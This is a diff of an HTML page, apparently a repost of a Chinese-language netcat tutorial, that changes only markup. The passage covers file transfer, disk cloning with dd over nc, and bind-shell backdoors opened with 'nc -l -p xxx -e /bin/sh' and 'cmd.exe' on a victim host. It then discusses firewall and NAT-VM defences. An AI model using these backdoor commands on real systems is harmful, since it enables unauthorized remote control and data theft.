+<p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）<br />
 nc -l -p xxx &gt; file2</p>
-<p>然后在【发送端】（A 主机）运行如下命令。<br>
-nc x.x.x.x xxx &lt; file1<br>
+<p>然后在【发送端】（A 主机）运行如下命令。<br />
+nc x.x.x.x xxx &lt; file1<br />
 　　第二条命令中的 xxx 是端口号，要与第一条命令中的端口号相同；第二条命令中的 x.x.x.x 是【主机 B】的 IP 地址。</p>
 <p>◇补充说明：nc 的性能优势</p>
-<p>用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。<br>
-　　（不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型）<br>
+<p>用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。<br />
+　　（不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型）<br />
 　　如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言）</p>
 <h2 id="招数10系统管理用-nc-远程备份整个磁盘"><a class="markdownIt-Anchor" href="#招数10系统管理用-nc-远程备份整个磁盘"></a> 招数10：（系统管理）用 nc 远程备份整个磁盘</h2>
 <p>◇使用场景</p>
-<p>当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。<br>
+<p>当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。<br />
 　　无论是对“系统管理员”，还是对“入侵者”甚至是“数据取证人员”，这招都是蛮有用滴。</p>
-<p>考虑到某些读者是“技术菜鸟”，俺稍微说明一下。<br>
-　　“磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：<br>
-　　性能差异——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。<br>
-　　完整性差异——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。<br>
+<p>考虑到某些读者是“技术菜鸟”，俺稍微说明一下。<br />
+　　“磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：<br />
+　　性能差异——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。<br />
+　　完整性差异——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。<br />
 　　一般来说，“系统管理员”和“入侵者”更看重第1个差异（性能）；而“数据取证人员”更看重第2个差异（完整性）。</p>
 <p>◇原理</p>
-<p>为了传输整个磁盘，你需要用到 dd 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。<br>
-　　俺曾经在如下博文中稍微介绍过 dd 命令的使用。<br>
-《如何用 ISO 镜像制作 U 盘安装盘（通用方法、无需 WinPE）》<br>
+<p>为了传输整个磁盘，你需要用到 dd 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。<br />
+　　俺曾经在如下博文中稍微介绍过 dd 命令的使用。<br />
+《如何用 ISO 镜像制作 U 盘安装盘（通用方法、无需 WinPE）》<br />
 　　关于 dd 命令的更详细介绍，可以参见“维基百科”（这里）或“Gnu 官网”（这里）。</p>
-<p>通过 dd 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。<br>
+<p>通过 dd 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。<br />
 　　在本章节，由于最终目的是要【跨主机备份磁盘】，所以并【不】需要真的把 dd 命令的输出保存成文件，而是把 dd 的输出通过管道符（|）重定向给【本机】的 nc，然后让【本机】的 nc 发送到另一台主机的 nc（参见前一个招数）。</p>
 <p>◇方法</p>
-<p>由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。<br>
+<p>由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。<br />
 　　假设你要把 A 主机 /dev/sda 磁盘的【原始数据】整个复制到 B 主机的 /dev/sdb 磁盘。</p>
-<p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）<br>
+<p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）<br />
 nc -l -p xxx | dd of=/dev/sdb</p>
-<p>然后在【发送端】（A 主机）运行如下命令。<br>
-dd if=/dev/sda | nc x.x.x.x xxx<br>
+<p>然后在【发送端】（A 主机）运行如下命令。<br />
+dd if=/dev/sda | nc x.x.x.x xxx<br />
 　　第二条命令中的 xxx 是端口号，要与第一条命令中的端口号相同；第二条命令中的 x.x.x.x 是【主机 B】的 IP 地址。</p>
 <p>◇补充说明：nc 的性能优势</p>
-<p>如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。<br>
+<p>如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。<br />
 　　（具体的原因，前一个章节已经分析过了）</p>
 <h2 id="招数11入侵手法用-nc-开启被动连接型后门"><a class="markdownIt-Anchor" href="#招数11入侵手法用-nc-开启被动连接型后门"></a> 招数11：（入侵手法）用 nc 开启【被动】连接型后门</h2>
-<p>既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。<br>
+<p>既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。<br />
 　　做这方面的介绍，并【不是】为了传授入侵技巧；而是为了——让那些注重安全性的同学，能做到“知己知彼”。</p>
 <p>◇使用场景</p>
-<p>假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。<br>
-　　假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。<br>
-　　假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。<br>
-　　当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。<br>
+<p>假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。<br />
+　　假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。<br />
+　　假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。<br />
+　　当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。<br />
 　　在该场景中，因为攻击者与你处于【同一个局域网】，攻击者自然能从自己的机器访问到你本机的 nc 后门。</p>
 <p>◇原理</p>
-<p>为了让后门能工作，通常会使用 nc 的 -e 选项，该选项的“选项值”是一个可执行文件的路径。<br>
-　　设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。<br>
-　　为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 cmd.exe；对 POSIX 系统（Linux or UNIX）而言，就是 /bin/sh<br>
+<p>为了让后门能工作，通常会使用 nc 的 -e 选项，该选项的“选项值”是一个可执行文件的路径。<br />
+　　设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。<br />
+　　为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 cmd.exe；对 POSIX 系统（Linux or UNIX）而言，就是 /bin/sh<br />
 　　在这种情况下（nc 挂载 shell），攻击者远程连入 nc 的端口，就可以直接在这个 shell 上进行各种操作，其效果类似于 SSH 或（老式的）telnet。</p>
 <p>◇入侵方法</p>
-<p>步骤1<br>
-　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 xxx 是端口号）<br>
-nc.exe -l -p xxx -e cmd.exe<br>
-　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：<br>
+<p>步骤1<br />
+　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 xxx 是端口号）<br />
+nc.exe -l -p xxx -e cmd.exe<br />
+　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：<br />
 nc -l -p xxx -e /bin/sh</p>
-<p>步骤2<br>
+<p>步骤2<br />
 　　后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p>
 <p>◇补充说明：-e 选项</p>
-<p>据说是考虑到 -e 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br>
+<p>据说是考虑到 -e 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br />
 　　另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。</p>
 <p>◇【不够】靠谱的防范措施</p>
-<p>在这个场景中，大伙儿可能会想到三个值得改进之处：<br>
-1、浏览器的漏洞<br>
-2、使用公共 wifi 热点的习惯<br>
+<p>在这个场景中，大伙儿可能会想到三个值得改进之处：<br />
+1、浏览器的漏洞<br />
+2、使用公共 wifi 热点的习惯<br />
 3、防火墙的设置</p>
-<p>对第1点<br>
+<p>对第1点<br />
 　　其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】；</p>
-<p>对第2点<br>
+<p>对第2点<br />
 　　要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。</p>
-<p>对第3点<br>
-　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br>
-　　但是！（俺要开始说【但是】了）<br>
-　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br>
-比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br>
-再比如说：直接把防火墙的过滤模块干掉；<br>
+<p>对第3点<br />
+　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br />
+　　但是！（俺要开始说【但是】了）<br />
+　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br />
+比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br />
+再比如说：直接把防火墙的过滤模块干掉；<br />
 更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层）</p>
 <p>◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</p>
 <p>首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《扫盲操作系统虚拟机》系列教程。</p>
-<p>要想用这招，步骤如下：<br>
-1、当然先要安装【虚拟化软件】（VBox、VMware …），<br>
-2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br>
+<p>要想用这招，步骤如下：<br />
+1、当然先要安装【虚拟化软件】（VBox、VMware …），<br />
+2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br />
 3、虚拟系统的网卡设置为【NAT】模式</p>
-<p>完成上述步骤后，你就可以在这个虚拟系统中上网。<br>
-　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br>
+<p>完成上述步骤后，你就可以在这个虚拟系统中上网。<br />
+　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br />
 　　在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。</p>
 <p>◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</p>
-<p>上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br>
+<p>上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br />
 　　也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。</p>
-<h2 id><a class="markdownIt-Anchor" href="#"></a> </h2>
+<h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2>
 <h2 id="-2"><a class="markdownIt-Anchor" href="#-2"></a> </h2>
-<p><a href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2019/09/Netcat-Tricks.html</a><br>
-<a href="https://program-think.blogspot.com/2016/03/GitHub-Security-Tips.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2016/03/GitHub-Security-Tips.html</a><br>
-<a href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2019/09/Netcat-Tricks.html</a><br>
-<a href="https://program-think.blogspot.com/2013/11/tor-faq.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2013/11/tor-faq.html</a><br>
-<a href="https://program-think.blogspot.com/2009/09/break-through-gfw-with-tor.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2009/09/break-through-gfw-with-tor.html</a><br>
+<p><a href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2019/09/Netcat-Tricks.html</a><br />
+<a href="https://program-think.blogspot.com/2016/03/GitHub-Security-Tips.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2016/03/GitHub-Security-Tips.html</a><br />
+<a href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2019/09/Netcat-Tricks.html</a><br />
+<a href="https://program-think.blogspot.com/2013/11/tor-faq.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2013/11/tor-faq.html</a><br />
+<a href="https://program-think.blogspot.com/2009/09/break-through-gfw-with-tor.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2009/09/break-through-gfw-with-tor.html</a><br />
 <a href="https://program-think.blogspot.com/2019/04/Proxy-Tricks.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2019/04/Proxy-Tricks.html</a></p>
 
       
@@ -640,7 +642,7 @@ nc -l -p xxx -e /bin/sh</p>
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="https://dreamerjonson.com/2019/11/14/扫盲-netcat（网猫）的-N-种用法——从网络诊断”到“系统入侵/" title="扫盲 netcat（网猫）的 N 种用法——从网络诊断”到“系统入侵" target="_blank" rel="external">https://dreamerjonson.com/2019/11/14/扫盲-netcat（网猫）的-N-种用法——从网络诊断”到“系统入侵/</a>
+      <a href="https://dreamerjonson.com/2019/11/14/%E6%89%AB%E7%9B%B2-netcat%EF%BC%88%E7%BD%91%E7%8C%AB%EF%BC%89%E7%9A%84-N-%E7%A7%8D%E7%94%A8%E6%B3%95%E2%80%94%E2%80%94%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E2%80%9D%E5%88%B0%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5/" title="扫盲 netcat（网猫）的 N 种用法——从网络诊断”到“系统入侵" target="_blank" rel="external">https://dreamerjonson.com/2019/11/14/%E6%89%AB%E7%9B%B2-netcat%EF%BC%88%E7%BD%91%E7%8C%AB%EF%BC%89%E7%9A%84-N-%E7%A7%8D%E7%94%A8%E6%B3%95%E2%80%94%E2%80%94%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E2%80%9D%E5%88%B0%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -800,11 +802,17 @@ nc -l -p xxx -e /bin/sh</p>
 <script>
 window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 </script>
+
 <script src="/js/plugin.min.js"></script>
+
+
 <script src="/js/application.js"></script>
 
 
+
+
 <script src="/js/mrmy.js"></script>
+
 
 
 
@@ -824,7 +832,9 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
     window.INSIGHT_CONFIG = INSIGHT_CONFIG;
 })(window);
 </script>
+
 <script src="/js/insight.js"></script>
+
 
 
 
